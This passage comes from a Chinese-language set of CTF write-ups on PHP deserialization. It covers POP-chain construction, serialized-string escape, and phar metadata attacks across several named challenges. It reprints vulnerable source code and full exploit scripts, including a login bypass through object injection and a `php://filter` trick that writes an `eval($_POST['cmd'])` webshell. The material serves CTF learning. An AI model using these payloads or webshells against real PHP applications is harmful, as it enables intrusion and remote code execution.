                $function = $this->p;
                return $function();
            }
        }
        if(isset($_GET['pop'])){
            @unserialize($_GET['pop']);
        }
        else{
            $a=new Show;
            highlight_file(__FILE__);
        }
    ```

- 代码审计

    从非定义部分的代码开始审查。

    ```php
        if(isset($_GET['pop'])){
            @unserialize($_GET['pop']);
        }
        else{
            $a=new Show;
            highlight_file(__FILE__);
        }
    ```

    在传入参数pop被设置时对其进行反序列化，那么再查看此前定义的类中哪些具有和反序列化相关的魔术方法，调用这些魔术方法中设置的代码，就可以执行此处反序列化之外更多的代码，从而实现我们读取flag.php中flag的要求。

    ```php
        class Modifier {
            protected  $var;
            public function append($value){
                include($value);
            }
            public function __invoke(){
                $this->append($this->var);
            }
        }
    ```

    Modifier类中append()方法会将传入参数包含，而此处魔术方法__invoke中设置了将Modifier类中的var属性作为传入值来调用append()函数，所以在这里需要让属性var的值为flag.php，再触发魔术方法__invoke即可。

    魔术方法__invoke被自动调用的条件是类被当成一个函数被调用，故接着来寻找和函数调用有关的代码。

    ```php
        class Show{
            public $source;
            public $str;
            public function __construct($file='index.php'){
                $this->source = $file;
                echo 'Welcome to '.$this->source."<br>";
            }
            public function __toString(){
                return $this->str->source;
            }
        
            public function __wakeup(){
                if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
                    echo "hacker";
                    $this->source = "index.php";
                }
            }
        }
    ```

    在Test类中有两个魔法函数__construct和__get，但魔法函数__construct这里用不上只需要关注魔法函数__get就好。魔法函数__get中设置了属性p会被当做函数调用，刚好符合前面Modifier类中的要求。故需要再触发魔法函数__get即可

    魔法函数__get会在访问类中一个不存在的属性时自动调用，那就需要寻找和调用属性相关的代码。

    ```php
        class Test{
            public $p;
            public function __construct(){
                $this->p = array();
            }
            public function __get($key){
                $function = $this->p;
                return $function();
            }
        }
    ```

    Show类中有三个魔术方法

    在魔术方法__toString中会返回属性str中的属性source，如果刚刚提到的source属性不存在，那么就符合了Test类中的要求

    魔术方法__toString在类被当做一个字符串处理时会被自动调用，在魔术方法__wakeup则将属性source传入正则匹配函数preg_match()，在这个函数中source属性就被当做字符串处理。

    最终这个魔术方法__wakeup又在类被反序列化时自动调用。

    这样从Test类中append()方法到Show类中的魔术方法__wakup就形成了一条调用链，这就是POP的一个使用样例，而题目——Ezpop就说明了这题设计的知识。

    整个过程：

    反序列化->调用Show类中魔术方法__wakeup->preg_match()函数对Show类的属性source处理->调用Show类中魔术方法__toString->返回Show类的属性str中的属性source(此时这里属性source并不存在)->调用Test类中魔术方法__get->返回Test类的属性p的函数调用结果->调用Modifier类中魔术方法__invoke->include()函数包含目标文件(flag.php)

    构造payload的代码(读取flag.php中的flag需要伪协议)：

    ```php
        <?php
        class Modifier {
            protected  $var="flag.php";
        }
        class Show{
            public $source;
            public $str;
        }
        class Test{
            public $p;
        }
        $a = new Show();
        $b= new Show();
        $a->source=$b;
        $b->str=new Test();
        ($b->str)->p=new Modifier();
        echo urlencode(serialize($a));
    ```

#### GYCTF2020 EasyPHP(反序列化SQL注入)

1. 尝试了一下robots.txt,没反应；有尝试了一下www.zip,拿到了源码。关键php文件update.php和lib.php

    lib.php
    ```php
    <?php
    error_reporting(0);
    session_start();
    function safe($parm){
        $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
        return str_replace($array,'hacker',$parm);
    }
    class User
    {
        public $id;
        public $age=null;
        public $nickname=null;
        public function login() {
            if(isset($_POST['username'])&&isset($_POST['password'])){
            $mysqli=new dbCtrl();
            $this->id=$mysqli->login('select id,password from user where username=?');
            if($this->id){
            $_SESSION['id']=$this->id;
            $_SESSION['login']=1;
            echo "你的ID是".$_SESSION['id'];
            echo "你好！".$_SESSION['token'];
            echo "<script>window.location.href='./update.php'</script>";
            return $this->id;
            }
        }
    }
        public function update(){
            $Info=unserialize($this->getNewinfo());
            $age=$Info->age;
            $nickname=$Info->nickname;
            $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
            //这个功能还没有写完 先占坑
        }
        public function getNewInfo(){
            $age=$_POST['age'];
            $nickname=$_POST['nickname'];
            return safe(serialize(new Info($age,$nickname)));
        }
        public function __destruct(){
            return file_get_contents($this->nickname);//危
        }
        public function __toString()
        {
            $this->nickname->update($this->age);
            return "0-0";
        }
    }
    class Info{
        public $age;
        public $nickname;
        public $CtrlCase;
        public function __construct($age,$nickname){
            $this->age=$age;
            $this->nickname=$nickname;
        }
        public function __call($name,$argument){
            echo $this->CtrlCase->login($argument[0]);
        }
    }
    Class UpdateHelper{
        public $id;
        public $newinfo;
        public $sql;
        public function __construct($newInfo,$sql){
            $newInfo=unserialize($newInfo);
            $upDate=new dbCtrl();
        }
        public function __destruct()
        {
            echo $this->sql;
        }
    }
    class dbCtrl
    {
        public $hostname="127.0.0.1";
        public $dbuser="root";
        public $dbpass="root";
        public $database="test";
        public $name;
        public $password;
        public $mysqli;
        public $token;
        public function __construct()
        {
            $this->name=$_POST['username'];
            $this->password=$_POST['password'];
            $this->token=$_SESSION['token'];
        }
        public function login($sql)
        {
            $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
            if ($this->mysqli->connect_error) {
                die("连接失败，错误:" . $this->mysqli->connect_error);
            }
            $result=$this->mysqli->prepare($sql);
            $result->bind_param('s', $this->name);
            $result->execute();
            $result->bind_result($idResult, $passwordResult);
            $result->fetch();
            $result->close();
            if ($this->token=='admin') {
                return $idResult;
            }
            if (!$idResult) {
                echo('用户不存在!');
                return false;
            }
            if (md5($this->password)!==$passwordResult) {
                echo('密码错误！');
                return false;
            }
            $_SESSION['token']=$this->name;
            return $idResult;
        }
        public function update($sql)
        {
            //还没来得及写
        }
    }
    ```
    update.php
    ```php
    <?php
    require_once('lib.php');
    echo '<html>
    <meta charset="utf-8">
    <title>update</title>
    <h2>这是一个未完成的页面，上线时建议删除本页面</h2>
    </html>';
    if ($_SESSION['login']!=1){
        echo "你还没有登陆呢！";
    }
    $users=new User();
    $users->update();
    if($_SESSION['login']===1){
        require_once("flag.php");
        echo $flag;
    }
    ?>
    ```

    审计lib.php的dbCtrl类可以发现要想获得flag有两种办法

    1. token = admin
    2. 获取admin用户的密码

    POP链如下：

    ```php
    UpdateHelper::__destruct() -> User::__toString() -> Info::__call() -> dbCtrl::login()
    ```

    把UpdateHelper类的sql赋值成了一个User类，UpdateHelper类的__destruct会echo this->sql,触发User类的__toString。

    因为User类的nickname被赋值成了一个Info类，而Info类是没有update函数的，这时候会默认触发Info的__call函数，调用CtrlCase的login。
    
    CtrlCase已经实例化成dbCtrl，参数是User的age，我们改成'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'
    这时候就达到目的：执行了login（select 1,“c4ca4238a0b923820dcc509a6f75849b” from user where username=?）

    脚本

    ```php
    <?php
    class User
    {
        public $age=null;
        public $nickname=null;
        public function __construct(){
            // sql语句也可以写成 "select password,id from user where username=?"通过获取密码拿flag
            // password 放到第一位 因为最终在界面回显的是第一个值
            $this->age='select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?';
            $this->nickname = new Info();
        }
    }
    class Info{
        public $CtrlCase;
        public function __construct(){
            $this->CtrlCase = new dbCtrl();
        }
    }
    Class UpdateHelper{
        public $sql;
        public function __construct(){
        $this->sql = new User();
        }
    }
    class dbCtrl
    {
        public $name = 'admin';
        public $password = "1";
    }

    $a = new UpdateHelper;
    $b = serialize($a);
    echo $b;
    ```
    此时我们得到了一个反序列化字符串,下一步是要让它被服务器序列化,这就要用到字符串逃逸了

    ```php
    <?php
    class Info{
        public $age;
        public $nickname;
        public $CtrlCase;
    }

    $a = new Info();
    $a->age = "1";
    $a->nickname = '";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}';
    $b = serialize($a);
    echo $b;
    ?>
    ```

    序列化结果
    ```php
    O:4:"Info":3:{s:3:"age";s:1:"1";s:8:"nickname";s:263:"";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}";s:8:"CtrlCase";N;}
    ```

    *是会被替换成hacker的，这样nickname的实际长度变长，但是s:263是固定的，所以后台一直认定nickname就是263个字符长。如果*的数量够多，那么我们后面的s:8:"CtrlCase";O:12:"UpdateHelper"就能逃逸出来，成功注入了一个UpdateHelper类。

    payload 的长度是263，* 和hacker相差5个字符，into和hacker相差2个字符，union和hacker相差1个字符。所以一共要有个into，1个union和52个 *

    然后把构造好的payload post传入后台，如果页面出现10-0，则表示执行成功，去登录界面登录，用户名admin，密码随意，拿到flag。

#### 强网杯 2019 Upload(文件上传)

1. 刚打开发现是登录注册页面，因为题目提示upload所以猜测应该和sql注入没关系，所以直接注册登录，发现了文件上传点，一开始直接传了一个木马，没成功，传了一个图片马，成功了，但是没法执行，后台回修改文件名
2. 没思路了，就想着扫一下目录吧，发现了`www.tar.gz`,源码泄露，有`.idea`文件，用phpstorm打开(仅打开当前项目所在文件夹)，有两个断点提示。
    ![断点1](./image/index.png)
    ![断点2](./image/register.png)
    审计第一处断点所在文件，发现会利用cookie反序列化，所以这应该是一个利用点

    application/web/controller/Index.php 里的：
    首先访问大部分页面例如 `index` 都会调用 `login_check` 方法。
    该方法会先将传入的用户 `Profile` 反序列化，而后到数据库中检查相关信息是否一致。

    `application/web/controller/Register.php` 里的：
    `Register` 的析构方法，判断注没注册，没注册的给调用 `check` 也就是 `Index` 的 `index` 方法，即跳到主页。

    [源码](./code/强网杯2019upload/)

    接着审计上传逻辑代码
    ```php
    public function upload_img(){
        if($this->checker){
            if(!$this->checker->login_check()){
                $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
                $this->redirect($curr_url,302);
                exit();
            }
        }

        if(!empty($_FILES)){
            $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
            $this->filename=md5($_FILES['upload_file']['name']).".png";
            $this->ext_check();
        }
        if($this->ext) {
            if(getimagesize($this->filename_tmp)) {
                @copy($this->filename_tmp, $this->filename);
                @unlink($this->filename_tmp);
                $this->img="../upload/$this->upload_menu/$this->filename";
                $this->update_img();
            }else{
                $this->error('Forbidden type!', url('../index'));
            }
        }else{
            $this->error('Unknow file type!', url('../index'));
        }
    }
    ```
    第一步先判断是否登录；通过后第二步判断是否上传文件，然后验证后缀名，验证函数如下，png返回1，否则返回0；
    ```php
    public function ext_check(){
        $ext_arr=explode(".",$this->filename);
        $this->ext=end($ext_arr);
        if($this->ext=="png"){
            return 1;
        }else{
            return 0;
        }
    }
    ```
    后缀名验证通过后把复制文件到upload目录下，所以我们就可以利用这个函数把我们没第一次上传的图片马的内容复制到php文件中。所以下一步就是想办法调用这个函数。

    而 Profile 有 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。_get 会直接从 except 里找，_call 会调用自身的 name 成员变量所指代的变量所指代的方法。

    这时候再回头看作者给的第二个断点，利用 $this->checker->index();触发__call，这时候在__call中又会调用不存在的方法index，触发了__get。我们设置$except = ['index' => 'upload_img']，这样就会调用upload_img方法了。

    payload：
    ```php
    <?php
    namespace app\web\controller;
    error_reporting(0);

    class Register{
        public $checker;
        public $registed;
    }

    class Profile{
        public $checker;
        public $filename_tmp;
        public $filename;
        public $upload_menu;
        public $ext;
        public $img;
        public $except;
    }

    $profile = new Profile();
    $profile->checker = 0;
    $profile->ext = 1;
    $profile->except = ['index'=>'upload_img'];
    $profile->filename_tmp = './upload/1254adea244b6ef09ecedbb729f6c397/87328f29c1073c486f19bf593fbbefb1.png';
    $profile->filename = './upload/shell.php';

    $register = new Register();
    $register->registed = 0;
    $register->checker = $profile;

    echo base64_encode(serialize($register));
    ```

    *注意先上传图片马，然后修改cookie，重新访问一下，使用蚁剑连接filename指示的路径*

#### EIS2019 EzPOP

##### 源码

    [index.php](./code/EIS2019EzPOP/)

##### 解题

- 代码末尾看到一个`unserialize`,结合题目，考点大概是pop链反序列化
- 首先要找到利用点，在 B 类的`set`函数中有`file_put_contents()`,而写入的内容是`$data`,所以可以让`$data`中的内容为webshell。
- 但是往上看发现`$data`中有`exit`,这就会导致我们写入的webshell无法执行,这里可以用php伪协议绕过,具体参考[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
- 往上，虽然有个数据压缩的代码，但是只需要`options['data_compress']`为假就不进入`if`,就不会执行，经过了`serialize`函数，但这个函数并非是序列化函数，而是在`class B`中自定义的`serialize`函数。这个函数我们可以控制。

    ```php
    $serialize = $this->options['serialize'];
    return $serialize($data);
    ```

- 上面还对`$filename`这个参数进行了处理，具体就是字符串拼接,如果我们不赋值就不会拼接。

    ```php
    $filename = $this->getCacheKey($name);
    ...
    public function getCacheKey(string $name): string {
        return $this->options['prefix'] . $name;
    }
    ```

- 接下来就是调用`class B`中的`set`函数。`class B`中的函数没办法调用`set`,但是`class A`中`save`函数中有这么一句代码。

    ```php
    $this->store->set($this->key, $contents, $this->expire);
    ```

    所以这里只需要令`$this->store=new B()`就可以调用`class B`的`set`函数了

    下一步就是调用`save`函数了，而`class A`中下一个魔术函数`__destruct`就提供了调用`save`函数的方法，只需要令`$this->autosave=false`

    完整的pop链就出来了。

- pop链有了，下一步就是构造webshell了，因为原始代码会在文件中写入exit导致我们直接写入webshell的话是无法执行的。上面提到了可以用php伪协议绕过。

    ```php
    $filename = 'php://filter/write=convert.base64-decode/resource=xxx.php';
    $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . "aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4="
    file_put_contents($filename, $data);
    // 这样可以直接将base64解码后的内容写入xxx.php
    ```

    `PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=` 是 `<?php eval($_POST['cmd']); ?>`的base64编码

    base64 解码时以4个字符为一组。

    base64编码中只包含64个可打印字符，base64解码时遇到不在不在这64个字符中的字符会自动忽略，仅将合法字符组合进行解码
    
    所以`$data`前半部分字符中`<、?、()、;、>、\n`都不在这64个字符范围内，在解码时会自动将其忽略从而剩下`phpexit//`这9个字符以及`sprintf('%012d', $expire)`格式化打印的12个字符，因此为了防止在解码时破坏构造的webshell，所以需要在webshell的base64编码前加上三个字符组合成4的倍数。


- `$filename`来自`class A`的`key`,传参过程中没有经过什么变换，在`class A`中可以直接令`$this->key='php://filter/write=convert.base64-decode/resource=xxx.php'`

- `$data`来自`class A`的`$contents`，`$contents`变量来自函数`getForStorage()`的返回值，其中参数为数组`[$cleaned, $this->complete]`，两个选择，第一让`$cleaned`为shell内容，第二就是`$complete`

    *注意：这里的webshell base64编码次数由`class B`中`$this->options['serialize']`的值决定。当`$this->options['serialize'] = 'base64_encode'`时，不管是用那个变量构造webshell，都要对webshell编码两次，而且第二次编码时要在开头增加三个字符；当`$this->options['serialize'] = 'trim'`时， 编码一次就行，编码完成后在开头增加三个字符*

    ```php
    public function save() {
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }
    ```

    1. 利用`$cleaned`构造webshell

        `$cleaned`是`$this->cache`经过`cleanContents`函数处理的返回值

        ```php
        public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
        }
        ```
        这个函数首先会交换`$cachedProperties`数组中的键和值，即键值互换

        然后对传入的数组参数进行处理，具体操作时如果数组中某一个值仍是数组则对这个数组和`$cachedProperties`数组求交集，如果数组中的值不是数组就不做处理。

        这里我们就可以利用`$cache`对`$cleaned`进行赋值，在`class A`中令`$this->cache = array(1234=>'aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=')`
    
    2. 利用`$this->complete`构造webshell

        `$cleaned`为一个空数组就行了。它调用了`cleanContents($this->cache)`;因为函数参数是数组类型，所以让`$this->cache=array()`;为一个空数组，防止调用报错。

        所以在`class A`的初始化的时候令`$this->complete="111".base64_encode('<?php eval($_POST["cmd"]);?>')`

- 但是在`set`函数中`$data`经过了`class B`自定义的`serialize`函数处理

    ```php
        protected function serialize($data): string {
            if (is_numeric($data)) {
                return (string) $data;
            }

            $serialize = $this->options['serialize'];

            return $serialize($data);
        }
    ```
    所以这个自定义函数我们可控，这里有两种方法

    1. 两次base64编码，如

        ```php
        // class A
        $this->complete = base64_encode("111".base64_encode('<?php eval($_POST["cmd"]); ?>'));
        //class B
        $this->options['serialize'=>'base_decode'];
        ```

    2. 利用php中的一些处理字符串的函数使`$data`经过这种函数处理后不会改变webshell的base64编码值,如`trim`函数，这个函数作用是移除字符串首尾空白字符

        ```php
        // class A
        $this->complete = '"111".base64_encode('<?php eval($_POST["cmd"]); ?>')';
        // class B
        $this->options['serialize'=>'trim'];
        ```

- poc

    ```php
    <?php
    error_reporting(0);
    class A {
        protected $store;
        protected $key;
        protected $expire;
        public $complete;
        public function __construct() {
            $this->cache = array();
    /*        $this->complete = base64_encode("111".base64_encode('<?php eval($_POST["cmd"]); ?>'));*/
            $this->complete = "111".base64_encode('<?php eval($_POST["cmd"]); ?>');
            $this->key = "php://filter/write=convert.base64-decode/resource=eval.php";
            $this->store = new B();
            $this->autosave = false;
        }
    }
    class B {
        public $options = array();
        public function __construct(){
            $this->options['serialize'] = 'trim';
            $this->options['data_compress'] = false;
        }
    }
    echo urlencode(serialize(new A()));
```


### 类型四-phar反序列化

1. phar反序列化

    phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。

2. phar文件

    在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发

    php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。

    php中常见流包装器

    ```php
    file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
    http:// — 访问 HTTP(s) 网址
    ftp:// — 访问 FTP(s) URLs
    php:// — 访问各个输入/输出流（I/O streams）
    zlib:// — 压缩流
    data:// — 数据（RFC 2397）
    glob:// — 查找匹配的文件路径模式
    phar:// — PHP 归档
    ssh2:// — Secure Shell 2
    rar:// — RAR
    ogg:// — 音频流
    expect:// — 处理交互式的流
    ```

3. phar文件结构

    ```php
    stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?> 结尾，否则无法识别。xxx可以为自定义内容。
    manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。
    content:被压缩文件的内容
    signature (可空):签名，放在末尾。
    ```

    生成phar文件举例：

    ```php
    <?php
    class Test {
    }
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new Test();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    ?>
    ```
4. 漏洞利用条件
    1. phar文件要能够上传到服务器端。
    2. 要有可用的魔术方法作为“跳板”。
    3. 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。
5. 受影响的函数
    ![alt text](./phar-func.png)
6. 绕过方式

    当环境限制了phar不能出现在前面的字符里。可以使用`compress.bzip2://`和`compress.zlib://`等绕过
    ```php
    compress.bzip://phar:///test.phar/test.txt
    compress.bzip2://phar:///test.phar/test.txt
    compress.zlib://phar:///home/sx/test.phar/test.txt
    php://filter/resource=phar:///test.phar/test.txt
    ```
    当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。

    php://filter/read=convert.base64-encode/resource=phar://phar.phar

    GIF格式验证可以通过在文件头部添加GIF89a绕过
    1. $phar->setStub(“GIF89a”.“<?php __HALT_COMPILER(); ?>”); //设置stub
    2. 生成一个phar.phar，修改后缀名为phar.gif

#### CISCN2019华北赛区Day1-Web1 Dorpbox

1. 进入题目前提示php phar，所以这道题目应该是利用phar反序列化漏洞
2. 直接注册账号，登录后发现是上传文件页面，经过测试后发现只能上传图片类，就算成功上传了其他类型，后台也会将后缀名改为图片类型后缀
3. 上传成功后出现一个下载一个删除，看网上的wp到这一步就能猜测任意文件读取漏洞
4. 用bp抓下载和删除的包，发现一个post参数filename，按照惯例和经验，我们上传的文件是放在网站主目录/sandbox/hash目录下的，所以要想读取源码filename=../../xxx.php
5. 主要看 class.php 文件，因为有file_get_contents函数，可以让我们读取flag。这个利用点 `file_get_contents` 没有对关键字进行过滤，所以我们肯定是利用这个函数来获取flag 的。
   1. 首先是定义的 `close` 函数，我们跳转到哪里调用了这个`close()`,跟进代码，看到是User类的`__destrust()`调用了`close()`, 所以我们简单的逻辑就是：  `User-> __destruct() =>File -> close() -> 读取flag`。但是没有回显
   2. phar漏洞利用条件里面有一条需要有魔术方法作为跳板，`class.php`里面有个`__call()`函数，正好可以利用
   3. 如果想要读取文件内容，肯定要利用class.php中的File.close()，但是没有直接调用这个方法的语句；
   4. 注意到 User类中在 __destruct时调用了close()，按原逻辑，$db应该是mysqli即数据库对象，但是我们可以构造$db指定为 File对象，这样就可以读取到文件了。可读取到文件不能呈现给我们
   5. 注意到 `__call`魔术方法，这个魔术方法的主要功能就是，如果要调用的方法我们这个类中不存在，就会去File中找这个方法，并把执行结果存入 `$this->results[$file->name()][$func]`
   6. 刚好我们利用这一点：让 $db为 FileList对象，当 $db销毁时，触发 __destruct，调用close()，由于 FileList没有这个方法，于是去 File类中找方法，读取到文件，存入 results

    `$user -> __destruct() => $db -> close() => $db->__call(close) => $file -> close() =>$results=file_get_contents($filename) => FileList->__destruct()输出$result`

- pop链

    ```php
    <?php
    class User {
        public $db;
        public function __construct(){
            $this->db=new FileList(); 
        }
    }
    
    class FileList {
        private $files;
        private $results;
        private $funcs;
        public function __construct(){
            $this->files=array(new File());  
            $this->results=array();
            $this->funcs=array();
        }
    }
    
    class File {
        public $filename="/flag.txt";
    }
    
    $user = new User();
    $phar = new Phar("shell.phar"); //生成一个phar文件，文件名为shell.phar
    $phar-> startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER();?>"); //设置stub
    $phar->setMetadata($user); //将对象user写入到metadata中
    $phar->addFromString("shell.txt","snowy"); //添加压缩文件，文件名字为shell.txt,内容为snowy
    $phar->stopBuffering();
    ```

#### SWPUCTF2018 SimplePHP(文件泄露+phar反序列化)

1. 进去后发现文件上传，以为时文件上传漏洞，测试过后才发现只能上传图片类型，有后缀名校验，所以木马行不通，查看第二个文件展示页面，但是没有东西，url中有一个file参数，，用之前传的文件的文件名测试也不行，返回的都是文件不存在，所以这里猜测，文件名应该被改成md5加密ip地址或者文件名什么的了。
2. 用dirsearch扫描目录看到一个`/upload/`，访问了一下，发现里面存放的正好是之前上传的文件，结合文件展示页面，把文件名赋值给file参数，还是不行；改成`/upload/xxx.jpg`，还不行，想到用相对路径，成功。
3. 读取源码。(关键源码如下)

    file.php
    ```php
    <?php 
    header("content-type:text/html;charset=utf-8");  
    include 'function.php'; 
    include 'class.php'; 
    ini_set('open_basedir','/var/www/html/'); 
    $file = $_GET["file"] ? $_GET['file'] : ""; 
    if(empty($file)) { 
        echo "<h2>There is no file to show!<h2/>"; 
    } 
    $show = new Show(); 
    if(file_exists($file)) { 
        $show->source = $file; 
        $show->_show(); 
    } else if (!empty($file)){ 
        die('file doesn\'t exists.'); 
    } 
    ?> 
    ```

    class.php
    ```php
    <?php
    class C1e4r
    {
        public $test;
        public $str;
        public function __construct($name)
        {
            $this->str = $name;
        }
        public function __destruct()
        {
            $this->test = $this->str;
            echo $this->test;
        }
    }
    class Show
    {
        public $source;
        public $str;
        public function __construct($file)
        {
            $this->source = $file;   //$this->source = phar://phar.jpg
            echo $this->source;
        }
        public function __toString()
        {
            $content = $this->str['str']->source;
            return $content;
        }
        public function __set($key,$value)
        {
            $this->$key = $value;
        }
        public function _show()
        {
            if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
                die('hacker!');
            } else {
                highlight_file($this->source);
            }
            
        }
        public function __wakeup()
        {
            if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
                echo "hacker~";
                $this->source = "index.php";
            }
        }
    }
    class Test
    {
        public $file;
        public $params;
        public function __construct()
        {
            $this->params = array();
        }
        public function __get($key)
        {
            return $this->get($key);
        }
        public function get($key)
        {
            if(isset($this->params[$key])) {
                $value = $this->params[$key];
            } else {
                $value = "index.php";
            }
            return $this->file_get($value);
        }
        public function file_get($value)
        {
            $text = base64_encode(file_get_contents($value));
            return $text;
        }
    }
    ?> 
    ```
    看到`class.php`发现其中不少魔术函数，而且有两个类没用用到，源码中看到一句注释`//$this->source = phar://phar.jpg`,所以猜测可能是phar反序列化。其实还有一个原因时file.php中验证文件是否存在时用了一个file_exists()函数，这个函数会触发phar反序列化。
4. 分析源码，Test类中有个读文件内容的函数(Show类中也能读取文件,但是它过滤了f1ag.php)

    1. 分析class.php，Test()类中`__get($key)`函数调用`get($value)`函数,`get($value)`函数调用`file_get($value)`函数从而读取文件内容。而`__get($key)`被调用的条件是访问对象中不存在的属性;

    大致流程就是：`不存在的函数或属性->__get魔法函数->get函数->file_get函数读取`

    2. 这时，我们就要找到一个不存在的调用,Show()类中的`__toString()`函数有`$this->str['str']->source`,所以我们可以`$this->str['str'] = new Test()`,而Test()类中没有source属性或方法，正好可以触发`__get()`函数;

    到目前为止：`Show()::__toString()->__get魔法函数->get函数->file_get函数读取`

    3. 那么下一个问题就是想办法触发`__toString()`,这个魔法函数触发的条件是，把类当作字符串处理。Show类中没有,接着往上看,C1e4r类中`__destruct()`正好有`echo $this->test;`,那么我们就可以`$this-test = new Show()`,从而来触发`toString()`函数。而`__destruct`是自动触发的。整个pop链分析完成。
5. pop链构造代码

    ```php
    <?php
    class C1e4r
    {
        public $test;
        public $str;
    }
    class Show
    {
        public $source;
        public $str;
    }
    class Test
    {
        public $file;
        public $params;
    }

    $c = new Test();
    $c->params = array('source'=>'/var/www/html/f1ag.php');
    $b = new Show();
    $b->str['str'] = $c;
    $a = new C1e4r();
    $a->str = $b;

    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER();?>");
    $phar->setMetadata($a);
    $phar->addFromString('shell.txt','aaa');
    $phar->stopBuffering();
    ?>
    ```
    运行完后，在当前目录会生成一个`shell.phar`文件，改一下后缀名，上传，直接去访问/upload/，找到文件名记下来

    payload: `file=phar://upload/xxxx.jpg`,得到的内容base64解码

#### GXYCTF2019 BabysqliV3.0

1. 题目分析

    进去提示sql注入，其实这道题和sql注入无关，一开始的登录是弱密码，这道题的考点是phar反序列化

    **url末尾是file=的形式，怀疑是文件包含，并且自动在xxx后面加.php。**

    所以可以用php伪协议读取源码

    upload.php
    ```php
    <?php
    error_reporting(0);
    class Uploader{
        public $Filename;
        public $cmd;
        public $token;
        

        function __construct(){
            $sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
            $ext = ".txt";
            @mkdir($sandbox, 0777, true);
            if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
                $this->Filename = $_GET['name'];
            }
            else{
                $this->Filename = $sandbox.$_SESSION['user'].$ext;
            }

            $this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
            $this->token = $_SESSION['user'];
        }

        function upload($file){
            global $sandbox;
            global $ext;

            if(preg_match("[^a-z0-9]", $this->Filename)){
                $this->cmd = "die('illegal filename!');";
            }
            else{
                if($file['size'] > 1024){
                    $this->cmd = "die('you are too big (′▽`〃)');";
                }
                else{
                    $this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
                }
            }
        }

        function __toString(){
            global $sandbox;
            global $ext;
            // return $sandbox.$this->Filename.$ext;
            return $this->Filename;
        }

        function __destruct(){
            if($this->token != $_SESSION['user']){
                $this->cmd = "die('check token falied!');";
            }
            eval($this->cmd);
        }
    }

    if(isset($_FILES['file'])) {
        $uploader = new Uploader();
        $uploader->upload($_FILES["file"]);
        if(@file_get_contents($uploader)){
            echo "下面是你上传的文件：<br>".$uploader."<br>";
            echo file_get_contents($uploader);
        }
    }
    ?>
    ```

    home.php
    ```php
    <?php
    session_start();
    echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";
    error_reporting(0);
    if(isset($_SESSION['user'])){
        if(isset($_GET['file'])){
            if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
                die("hacker!");
            }
            else{
                if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){
                    $file = $_GET['file'].".php";
                }
                else{
                    $file = $_GET['file'].".fxxkyou!";
                }
